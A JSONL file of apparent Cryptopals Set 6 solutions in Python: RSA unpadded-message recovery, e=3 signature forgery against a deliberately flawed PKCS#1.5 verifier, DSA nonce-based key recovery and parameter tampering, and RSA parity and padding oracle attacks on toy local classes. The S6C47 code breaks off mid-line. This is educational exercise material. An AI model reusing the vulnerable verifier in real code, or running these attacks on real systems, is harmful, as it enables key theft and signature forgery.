{"source": "cryptopals", "path": "data\\cryptopals\\S6C41.py", "category": "crypto", "solution_code": "from S5C39 import RSA, mod_inv, int_to_bytes\nfrom random import randint\n\n\ndef unpadded_message_recovery(ciphertext, rsa_server):\n    \"\"\"Performs the unpadded message recovery attack on the rsa_server which does not use padding.\"\"\"\n\n    # Let N and E be the public modulus and exponent respectively\n    e, n = rsa_server.get_public_key()\n\n    # Let S be a random number > 1 mod N\n    while True:\n        s = randint(2, n - 1)\n        if s % n > 1:\n            break\n\n    # Create a new forged ciphertext\n    new_ciphertext = (pow(s, e, n) * ciphertext) % n\n\n    # Decipher it and convert the deciphered string to an int\n    new_plaintext = rsa_server.decrypt(new_ciphertext)\n    int_plaintext = int.from_bytes(new_plaintext, byteorder='big')\n\n    # Recover the original plaintext as int, remembering to be careful about division in cyclic groups\n    r = (int_plaintext * mod_inv(s, n)) % n\n\n    # Convert it back to bytes and return it\n    return int_to_bytes(r)\n\n\nclass RSAServer:\n    \"\"\"This server allows to submit an arbitrary RSA blob and will return the corresponding plaintext\n    decrypted with the private key stored on the server. However, it keeps hashes of the messages that\n    have been decrypted and rejects the decryption when a ciphertext is submitted more than once.\n    NOTE: the messages are supposed to have an embedded timestamp, so they are unique.\n    \"\"\"\n\n    def __init__(self, rsa):\n        self._rsa = rsa\n        self._decrypted = set()\n\n    def get_public_key(self):\n        return self._rsa.e, self._rsa.n\n\n    def decrypt(self, data):\n        \"\"\"If the data has not be decrypted before, it decrypts it, otherwise it raises an exception.\"\"\"\n        if data in self._decrypted:\n            raise Exception(\"This ciphertext has already been decrypted\")\n        self._decrypted.add(data)\n        return self._rsa.decrypt(data)\n\n\ndef main():\n    plaintext = b\"Hello, I'm another Javascript programmer.\"\n    rsa = RSA(1024)\n    ciphertext = rsa.encrypt(plaintext)\n    rsa_server = RSAServer(rsa)\n\n    # Test if the attack works\n    recovered_plaintext = unpadded_message_recovery(ciphertext, rsa_server)\n    assert recovered_plaintext == plaintext\n\n\nif __name__ == '__main__':\n    main()\n", "name": "S6C41"}
{"source": "cryptopals", "path": "data\\cryptopals\\S6C42.py", "category": "crypto", "solution_code": "import re\nfrom S4C28 import sha1\nfrom binascii import unhexlify\nfrom S5C40 import find_cube_root\nfrom S5C39 import int_to_bytes, RSA\n\n\n# 15-byte ASN.1 value for SHA1 (from rfc 3447)\nASN1_SHA1 = b'\\x30\\x21\\x30\\x09\\x06\\x05\\x2b\\x0e\\x03\\x02\\x1a\\x05\\x00\\x04\\x14'\n\n\nclass RSADigitalSignature(RSA):\n    \"\"\"Extends the RSA class coded before with the sign / verify functions.\"\"\"\n\n    def sign(self, message):\n        return self.decrypt(int.from_bytes(message, byteorder='big'))\n\n    def verify(self, encrypted_signature, message):\n\n        # Decrypt the given encrypted signature\n        signature = b'\\x00' + int_to_bytes(self.encrypt(encrypted_signature))\n\n        # Verify that the signature contains a block in PKCS1.5 standard format (vulnerable implementation)\n        r = re.compile(b'\\x00\\x01\\xff+?\\x00.{15}(.{20})', re.DOTALL)\n        m = r.match(signature)\n        if not m:\n            return False\n\n        # Take the hash part of the signature and compare with the server-computed hash\n        hashed = m.group(1)\n        return hashed == unhexlify(sha1(message))\n\n\ndef forge_signature(message, key_length):\n    \"\"\"Forges a valid RSA signature for the given message using the Bleichenbacher's e=3 RSA Attack.\"\"\"\n\n    # Prepare the block which will look like PKCS1.5 standard format to the vulnerable server\n    block = b'\\x00\\x01\\xff\\x00' + ASN1_SHA1 + unhexlify(sha1(message))\n    garbage = (((key_length + 7) // 8) - len(block)) * b'\\x00'\n    block += garbage\n\n    # Get the int version of the block and find its cube root (emulating the signing process)\n    pre_encryption = int.from_bytes(block, byteorder='big')\n    forged_sig = find_cube_root(pre_encryption)\n\n    # Convert the signature to bytes and return it\n    return int_to_bytes(forged_sig)\n\n\ndef main():\n    message = b'hi mom'\n    forged_signature = forge_signature(message, 1024)\n\n    assert RSADigitalSignature(1024).verify(forged_signature, message)\n\n\nif __name__ == '__main__':\n    main()\n", "name": "S6C42"}
{"source": "cryptopals", "path": "data\\cryptopals\\S6C43.py", "category": "crypto", "solution_code": "from S5C39 import mod_inv\nfrom S4C28 import sha1\nfrom random import randint\n\n\nclass DSA:\n    \"\"\"Implements the DSA public key encryption / decryption.\"\"\"\n    DEFAULT_P = int(\"800000000000000089e1855218a0e7dac38136ffafa72eda7859f2171e25e65eac698c1702578b07dc2a1076da241c76\"\n                    \"c62d374d8389ea5aeffd3226a0530cc565f3bf6b50929139ebeac04f48c3c84afb796d61e5a4f9a8fda812ab59494232\"\n                    \"c7d2b4deb50aa18ee9e132bfa85ac4374d7f9091abc3d015efc871a584471bb1\", 16)\n    DEFAULT_Q = 0xf4f47f05794b256174bba6e9b396a7707e563c5b\n    DEFAULT_G = int(\"5958c9d3898b224b12672c0b98e06c60df923cb8bc999d119458fef538b8fa4046c8db53039db620c094c9fa077ef389\"\n                    \"b5322a559946a71903f990f1f7e0e025e2d7f7cf494aff1a0470f5b64c36b625a097f1651fe775323556fe00b3608c88\"\n                    \"7892878480e99041be601a62166ca6894bdd41a7054ec89f756ba9fc95302291\", 16)\n\n    def __init__(self, q=DEFAULT_Q, p=DEFAULT_P, g=DEFAULT_G):\n        self.q = q\n        self.p = p\n        self.g = g\n        self._x = randint(1, self.q - 1)\n        self.y = pow(self.g, self._x, self.p)\n\n    @staticmethod\n    def H(message):\n        return int(sha1(message), 16)\n\n    def sign(self, message):\n\n        while True:\n            k = randint(1, self.q - 1)\n            r = pow(self.g, k, self.p) % self.q\n            if r == 0:\n                continue\n\n            s = (mod_inv(k, self.q) * (self.H(message) + self._x * r)) % self.q\n            if s != 0:\n                break\n\n        return r, s\n\n    def verify(self, message, r, s):\n\n        if not (0 < r < self.q) or not (0 < s < self.q):\n            return False\n\n        w = mod_inv(s, self.q)\n        u1 = (self.H(message) * w) % self.q\n        u2 = (r * w) % self.q\n\n        t1 = pow(self.g, u1, self.p)\n        t2 = pow(self.y, u2, self.p)\n        v = ((t1 * t2) % self.p) % self.q\n\n        return v == r\n\n\ndef get_x_from_k(q, k, r, s, hash_of_message):\n    \"\"\"Recovers the private key x given the k sub-key used for the DSA signatures.\"\"\"\n    return (((s * k) - hash_of_message) * mod_inv(r, q)) % q\n\n\ndef key_recovery_from_nonce(r, s, hash_of_message, y):\n    \"\"\"Finds the DSA private key x given the the DSA signature of a given message, by brute forcing\n    the value of the sub-key k, which we know was chosen among a small range.\n    \"\"\"\n\n    # Try all possible values of k\n    for k in range(2 ** 16):\n        x = get_x_from_k(DSA.DEFAULT_Q, k, r, s, hash_of_message)\n\n        # If the private key x corresponding to the current k generates the correct public key, return it\n        if pow(DSA.DEFAULT_G, x, DSA.DEFAULT_P) == y:\n            return x\n\n\ndef main():\n\n    # Check that the implementation of DSA is correct\n    dsa = DSA()\n    r, s = dsa.sign(b\"hello\")\n    assert dsa.verify(b\"hello\", r, s)\n\n    # Given the following values, we can recover the private key x, when k is chosen among a small range\n    message = b\"For those that envy a MC it can be hazardous to your health\\n\" \\\n              b\"So be friendly, a matter of life and death, just like a etch-a-sketch\\n\"\n    r = 548099063082341131477253921760299949438196259240\n    s = 857042759984254168557880549501802188789837994940\n    y = int(\"84ad4719d044495496a3201c8ff484feb45b962e7302e56a392aee4abab3e4bdebf2955b4736012f21a0808\"\n            \"4056b19bcd7fee56048e004e44984e2f411788efdc837a0d2e5abb7b555039fd243ac01f0fb2ed1dec56828\"\n            \"0ce678e931868d23eb095fde9d3779191b8c0299d6e07bbb283e6633451e535c45513b2d33c99ea17\", 16)\n\n    # Verify that the attack works and that the hacked private key produces the correct fingerprint\n    hacked_x = key_recovery_from_nonce(r, s, DSA.H(message), y)\n    c = hex(hacked_x)[2:].encode()\n    assert sha1(c) == \"0954edd5e0afe5542a4adf012611a91912a3ec16\"\n\n\nif __name__ == '__main__':\n    main()\n", "name": "S6C43"}
{"source": "cryptopals", "path": "data\\cryptopals\\S6C44.py", "category": "crypto", "solution_code": "import re\nfrom itertools import combinations\nfrom S6C43 import sha1, DSA, mod_inv, get_x_from_k\n\n\ndef parse_signature_file():\n    \"\"\"Parses the input file and returns an array containing (s, r, m) of each signature.\"\"\"\n    pattern = r'msg: [a-zA-Z.,\\' ]+\\n' \\\n              r's: ([0-9]+)\\n' \\\n              r'r: ([0-9]+)\\n' \\\n              r'm: ([0-9a-f]+)\\n?'\n\n    f = open('S6C44_input.txt')\n    s = f.read()\n    f.close()\n\n    return re.findall(pattern, s)\n\n\ndef nonce_recovery_from_repeated_nonce():\n    \"\"\"Finds two messages signed with the same nonce k, recovers that nonce k and, from k, gets the private key x.\"\"\"\n\n    # Parse the file with the signatures\n    signatures = parse_signature_file()\n\n    # Find two pairs of signatures that used the same k\n    # This is easy to find, because when the same k is used r will be the same, since r\n    # depends only on (g, p, q and k), and (g, p, q) are fixed in our implementation.\n    pairs = combinations(signatures, 2)\n    for (x, y) in pairs:\n        r1, r2 = int(x[1]), int(y[1])\n\n        # Check if this pair is one of those which used the same k\n        if r1 != r2:\n            continue\n\n        s1, s2 = int(x[0]), int(y[0])\n        m1, m2 = int(x[2], 16), int(y[2], 16)\n\n        # 9th grade math to find k (it's a simple system of linear equations)\n        k = (((m1 - m2) % DSA.DEFAULT_Q) * mod_inv((s1 - s2) % DSA.DEFAULT_Q, DSA.DEFAULT_Q)) % DSA.DEFAULT_Q\n        return get_x_from_k(DSA.DEFAULT_Q, k, r1, s1, m1)\n\n\ndef main():\n    y = int(\"2d026f4bf30195ede3a088da85e398ef869611d0f68f0713d51c9c1a3a26c95105d915e2d8cdf26d056b86b8a7b8\"\n            \"5519b1c23cc3ecdc6062650462e3063bd179c2a6581519f674a61f1d89a1fff27171ebc1b93d4dc57bceb7ae2430\"\n            \"f98a6a4d83d8279ee65d71c1203d2c96d65ebbf7cce9d32971c3de5084cce04a2e147821\", 16)\n\n    # Hack the key and from signatures which used a repeated nonce\n    hacked_x = nonce_recovery_from_repeated_nonce()\n    c = hex(hacked_x)[2:].encode()\n\n    # Check that the private key that we recovered is the correct one\n    assert sha1(c) == \"ca8f6f7c66fa362d40760d135b763eb8527d3d52\"\n    assert pow(DSA.DEFAULT_G, hacked_x, DSA.DEFAULT_P) == y\n\n\nif __name__ == '__main__':\n    main()\n", "name": "S6C44"}
{"source": "cryptopals", "path": "data\\cryptopals\\S6C45.py", "category": "crypto", "solution_code": "from S6C43 import DSA, mod_inv\n\n\ndef dsa_parameter_tempering():\n    \"\"\"Makes sure that with a proper DSA parameter tampering we can generate valid signatures for any message.\"\"\"\n\n    # I will skip the g = 1 tampering because my DSA implementation does not allow r = 0 anyway\n    # Let's go directly to the g = p + 1\n    dsa = DSA(g=DSA.DEFAULT_P + 1)\n\n    # Test that a legit signature works properly\n    some_text = b\"Let's see what happens when I sign this message with (g = p + 1) DSA\"\n    legit_signature = dsa.sign(some_text)\n    assert dsa.verify(some_text, legit_signature[0], legit_signature[1])\n\n    # Create a forged signature\n    z = 2\n    forged_r = pow(dsa.y, z, DSA.DEFAULT_P) % DSA.DEFAULT_Q\n    forged_s = (forged_r * mod_inv(z, dsa.DEFAULT_Q)) % dsa.DEFAULT_Q\n\n    # Test that a forged signature works properly\n    assert dsa.verify(b'Hello, world', forged_r, forged_s)\n    assert dsa.verify(b'Goodbye, world', forged_r, forged_s)\n\n\ndef main():\n    dsa_parameter_tempering()\n\n\nif __name__ == '__main__':\n    main()\n", "name": "S6C45"}
{"source": "cryptopals", "path": "data\\cryptopals\\S6C46.py", "category": "crypto", "solution_code": "from base64 import b64decode\nfrom S5C39 import int_to_bytes, RSA\nfrom math import ceil, log\nfrom decimal import *\n\n\nclass RSAParityOracle(RSA):\n    \"\"\"Extends the RSA class by adding a method to verify the parity of data.\"\"\"\n\n    def is_parity_odd(self, encrypted_int_data):\n        \"\"\"Decrypts the input data and returns whether the resulting number is odd.\"\"\"\n        return pow(encrypted_int_data, self._d, self.n) & 1\n\n\ndef parity_oracle_attack(ciphertext, rsa_parity_oracle, holliwood=False):\n    \"\"\"Decrypts the given ciphertext using just the parity method of the oracle. Here a detailed explanation:\n    http://secgroup.dais.unive.it/wp-content/uploads/2012/11/Practical-Padding-Oracle-Attacks-on-RSA.html\n    \"\"\"\n\n    # Compute the encryption of 2, which will be our ciphertext multiplier\n    multiplier = pow(2, rsa_parity_oracle.e, rsa_parity_oracle.n)\n\n    # Initialize lower and upper bound.\n    # I need to use Decimal because it allows me to set the precision for the floating point\n    # numbers, which we will need when doing the binary search divisions.\n    lower_bound = Decimal(0)\n    upper_bound = Decimal(rsa_parity_oracle.n)\n\n    # Compute the number of iterations that we have to do\n    k = int(ceil(log(rsa_parity_oracle.n, 2)))\n\n    # Set the precision of the floating point number to be enough\n    getcontext().prec = k\n\n    # Binary search for the correct plaintext\n    for _ in range(k):\n        ciphertext = (ciphertext * multiplier) % rsa_parity_oracle.n\n\n        if rsa_parity_oracle.is_parity_odd(ciphertext):\n            lower_bound = (lower_bound + upper_bound) / 2\n        else:\n            upper_bound = (lower_bound + upper_bound) / 2\n\n        # If the user wants to see the message being decrypted at every iteration, print the current upper_bound\n        if holliwood is True:\n            print(int_to_bytes(int(upper_bound)))\n\n    # Return the binary version of the upper_bound (converted from Decimal to int)\n    return int_to_bytes(int(upper_bound))\n\n\ndef main():\n    input_bytes = b64decode(\"VGhhdCdzIHdoeSBJIGZvdW5kIHlvdSBkb24ndCBwbGF5IG\"\n                            \"Fyb3VuZCB3aXRoIHRoZSBGdW5reSBDb2xkIE1lZGluYQ==\")\n\n    rsa_parity_oracle = RSAParityOracle(1024)\n\n    ciphertext = rsa_parity_oracle.encrypt(input_bytes)\n    rsa_parity_oracle.decrypt(ciphertext)\n\n    # Check if the attack works\n    plaintext = parity_oracle_attack(ciphertext, rsa_parity_oracle)\n    assert plaintext == input_bytes\n\n\nif __name__ == '__main__':\n    main()\n", "name": "S6C46"}
{"source": "cryptopals", "path": "data\\cryptopals\\S6C47.py", "category": "crypto", "solution_code": "from random import randint\nfrom S5C39 import int_to_bytes, RSA\nfrom Crypto import Random\n\n\ndef ceil(a, b):\n    return (a + b - 1) // b\n\n\nclass RSAPaddingOracle(RSA):\n    \"\"\"Extends the RSA class by making the decryption PKCS 1.5 compliant and by adding a method\n    to verify the padding of data.\"\"\"\n\n    def is_padding_correct(self, encrypted_int_data):\n        \"\"\"Decrypts the input data and returns whether its padding is correct according to PKCS 1.5.\n        NOTE: It is super important (I spent hours to debug this), that this method also checks\n        the length of the decrypted plaintext, and not only the starting bytes.\n        \"\"\"\n        plaintext = self.decrypt(encrypted_int_data)\n        return len(plaintext) == ceil(self.n.bit_length(), 8) and plaintext[:2] == b'\\x00\\x02'\n\n    def decrypt(self, encrypted_int_data):\n        \"\"\"Decrypts the data and prepends 0 (the first byte of the PKCS 1.5 format) to it.\"\"\"\n        return b'\\x00' + super(RSAPaddingOracle, self).decrypt(encrypted_int_data)\n\n\ndef append_and_merge(intervals, lower_bound, upper_bound):\n    \"\"\"Adds a new interval to the list of intervals. In particular:\n    If there is no interval overlapping with the given boundaries, it just appends the new interval to the list.\n    If there is already an interval overlapping with the given boundaries, it merges the two intervals together.\n    \"\"\"\n\n    # Check if there exist an interval which is overlapping with the lower_bound and\n    # upper_bound of the new interval we want to append\n    for i, (a, b) in enumerate(intervals):\n\n        # If there is an overlap, then replace the boundaries of the overlapping\n        # interval with the wider (or equal) boundaries of the new merged interval\n        if not (b < lower_bound or a > upper_bound):\n            new_a = min(lower_bound, a)\n            new_b = max(upper_bound, b)\n            intervals[i] = new_a, new_b\n            return\n\n    # If there was no interval overlapping with the one we want to add, add\n    # the new interval as a standalone interval to the list\n    intervals.append((lower_bound, upper_bound))\n\n\ndef pkcs_1_5_padding_oracle_attack(ciphertext, rsa_padding_oracle, key_byte_length, c_is_pkcs_conforming=True):\n    \"\"\"Implements the PKCS 1.5 padding oracle attack described by Bleichenbacher in CRYPTO '98.\"\"\"\n\n    # For convenience, let:\n    B = 2 ** (8 * (key_byte_length - 2))\n    n, e = rsa_padding_oracle.n, rsa_padding_oracle.e\n\n    # Set the starting values\n    c_0 = ciphertext\n    M = [(2 * B, 3 * B - 1)]\n    i = 1\n\n    # If c is not already PKCS 1.5 conforming, perform an additional step\n    if not c_is_pkcs_conforming:\n\n        # Step 1: Blinding\n        while True:\n            s = randint(0, n - 1)\n            c_0 = (ciphertext * pow(s, e, n)) % n\n            if rsa_padding_oracle.is_padding_correct(c_0):\n                break\n\n    # Find the decrypted message through several iterations\n    while True:\n\n        # Step 2.a: Starting the search\n        if i == 1:\n            s = ceil(rsa_padding_oracle.n, 3 * B)\n            while True:\n\n                c = (c_0 * pow(s, e, n)) % n\n                if rsa_padding_oracle.is_padding_correct(c):\n                    break\n\n                s += 1\n\n        # Step 2.b: Searching with more than one interval left\n        elif len(M) >= 2:\n            while True:\n                s += 1\n                c = (c_0 * pow(s, e, n)) % n\n\n                if rsa_padding_oracle.is_padding_correct(c):\n                    break\n\n        # Step 2.c: Searching with one interval left\n        elif len(M) == 1:\n            a, b = M[0]\n\n            # Check if the interval contains the solution\n            if a == b:\n\n                # And if it does, return it as bytes\n                return b'\\x00' + int_to_bytes(a)\n\n            r = ceil(2 * (b * s - 2 * B), n)\n            s = ceil(2 * B + r * n, b)\n\n            while True:\n                c = (c_0 * pow(s, e, n)) % n\n                if rsa_padding_oracle.is_padding_correct(c):\n                    break\n\n                s += 1\n                if s > (3 * B + r * n) // a:\n                    r += 1\n                    s = ceil((2 * B + r * n), b)\n\n        # Step 3: Narrowing the set of solutions\n        M_new = []\n\n        for a, b in M:\n            min_r = ceil(a * s - 3 * B + 1, n)\n            max_r = (b * s - 2 * B) // n\n\n            for r in range(min_r, max_r + 1):\n                l = max(a, ceil(2 * B + r * n, s))\n                u = min(b, (3 * B - 1 + r * n) // s)\n\n                if l > u:\n                    raise Exception('Unexpected error: l > u in step 3')\n\n                append_and_merge(M_new, l, u)\n\n        if len(M_new) == 0:\n            raise Exception('Unexpected error: there are 0 intervals.')\n\n        M = M_new\n        i += 1\n\n\ndef pkcs_1_5_pad(binary_data, key_byte_length):\n    \"\"\"Pads the given binary data conforming to the PKCS 1.5 format.\"\"\"\n    padding_string = Random.new().read(key_byte_length - 3 - len(binary_data))\n    return b'\\x00\\", "name": "S6C47"}
{"source": "cryptopals", "path": "data\\cryptopals\\S6C48.py", "category": "crypto", "solution_code": "from S6C47 import ceil, RSAPaddingOracle, pkcs_1_5_padding_oracle_attack, pkcs_1_5_pad\n\n\ndef main():\n    \"\"\"This challenge uses the same code of the S6C47 one.\n    I coded the full Bleichenbacher's algorithm directly there.\n    It just takes a little bit more time to run.\n    \"\"\"\n\n    key_bit_length = 768\n    key_byte_length = ceil(key_bit_length, 8)\n\n    rsa_padding_oracle = RSAPaddingOracle(key_bit_length)\n\n    # Pad a short message m and encrypt it to get c\n    data_block = b'kick it, CC'\n    m = pkcs_1_5_pad(data_block, key_byte_length)\n\n    c = rsa_padding_oracle.encrypt(m)\n\n    # Check that the rsa padding oracle decrypts the c correctly\n    assert rsa_padding_oracle.is_padding_correct(c)\n\n    # Test that the attack works\n    hacked_message = pkcs_1_5_padding_oracle_attack(c, rsa_padding_oracle, key_byte_length)\n    assert m == hacked_message\n\n\nif __name__ == '__main__':\n    main()\n", "name": "S6C48"}
